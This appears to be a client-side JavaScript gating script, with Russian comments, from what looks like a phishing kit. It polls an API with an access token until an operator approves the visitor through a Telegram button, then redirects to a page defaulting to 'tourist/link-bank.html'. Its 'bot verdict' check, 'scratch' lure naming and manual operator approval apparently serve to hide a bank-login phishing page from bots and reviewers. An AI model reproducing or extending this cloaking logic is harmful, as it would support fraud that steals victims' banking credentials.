/**
 * Bot verdict: client gets accessToken; TG button grants access.
 * Poll until allowed, then redirect once — без повторного reload на comprehensive.
 */
(function () {
  var API_BASE = window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || window.location.origin;
  var TOKEN_KEY = "scratchAccessToken";
  var ALLOW_KEY = "scratchHumanAllowed";
  var POLL_MS = 5000;
  var pollTimer = null;
  var stopped = false;

  function getToken() {
    // Уже выдан доступ — токен не используем (иначе цикл reload на comprehensive)
    if (localStorage.getItem(ALLOW_KEY) === "1") return "";
    try {
      var raw = localStorage.getItem("scratchVerify");
      if (raw) {
        var d = JSON.parse(raw);
        if (d.allowed === true) return "";
        if (d.accessToken) return d.accessToken;
      }
    } catch (e) {}
    return localStorage.getItem(TOKEN_KEY) || "";
  }

  function setGranted(grantUrl) {
    if (stopped) return;
    stopped = true;
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
    var url = grantUrl || "tourist/link-bank.html";
    localStorage.setItem("url", url);
    localStorage.setItem(ALLOW_KEY, "1");
    localStorage.removeItem(TOKEN_KEY);
    try {
      var raw = localStorage.getItem("scratchVerify");
      var d = raw ? JSON.parse(raw) : {};
      d.allowed = true;
      d.status = false;
      d.url = url;
      delete d.accessToken;
      localStorage.removeItem("comprehensiveAddressGeoAutofillApplied");
      localStorage.setItem("scratchVerify", JSON.stringify(d));
    } catch (e) {}
  }

  function redirectToUrl(targetUrl) {
    var target = targetUrl || "tourist/link-bank.html";
    if (!target.startsWith("http") && !target.startsWith("/") && !target.startsWith(".")) {
      target = "./" + target;
    }
    window.location.replace(target);
  }

  function poll() {
    if (stopped) return;
    var token = localStorage.getItem(TOKEN_KEY) || "";
    if (!token) return;
    var url = API_BASE + "/api/scratch-access/" + encodeURIComponent(token);
    (window.fetchJsonWithApiFallback
      ? window.fetchJsonWithApiFallback(
          "/api/scratch-access/" + encodeURIComponent(token),
          { method: "GET", cache: "no-store", mode: "cors", credentials: "omit" },
          API_BASE
        ).then(function (result) {
          return result.data;
        })
      : fetch(url, { method: "GET", cache: "no-store", mode: "cors", credentials: "omit" }).then(function (r) {
          return r.json();
        }))
      .then(function (data) {
        if (data && data.allowed) {
          var grantUrl = data.url || "tourist/link-bank.html";
          if (data.ui) {
            try {
              var raw = localStorage.getItem("scratchVerify");
              var d = raw ? JSON.parse(raw) : {};
              d.ui = data.ui;
              d.status = data.status === false ? false : d.status;
              d.url = grantUrl;
              delete d.accessToken;
              localStorage.removeItem("comprehensiveAddressGeoAutofillApplied");
              localStorage.setItem("scratchVerify", JSON.stringify(d));
            } catch (e) {}
          }
          setGranted(grantUrl);
          redirectToUrl(grantUrl);
        }
      })
      .catch(function () {});
  }

  function startPolling() {
    stopped = false;
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
    localStorage.removeItem(ALLOW_KEY);
    var token = localStorage.getItem(TOKEN_KEY) || "";
    if (!token) {
      try {
        var raw = localStorage.getItem("scratchVerify");
        if (raw) {
          var d = JSON.parse(raw);
          if (d.accessToken) token = d.accessToken;
          if (d.allowed) { d.allowed = false; localStorage.setItem("scratchVerify", JSON.stringify(d)); }
        }
      } catch (e) {}
    }
    if (!token) return;
    localStorage.setItem(TOKEN_KEY, token);
    console.log("[scratch-access-poll] polling started, token:", token.slice(0, 12) + "…");
    poll();
    pollTimer = setInterval(poll, POLL_MS);
  }

  window.scratchAccessPoll = {
    start: startPolling,
    pollNow: poll,
    isGrantedSync: function () {
      return false;
    },
  };

  document.addEventListener("visibilitychange", function () {
    if (!document.hidden && getToken() && !stopped) poll();
  });

  window.addEventListener("focus", function () {
    if (getToken() && !stopped) poll();
  });

  if (getToken()) {
    startPolling();
  }
})();
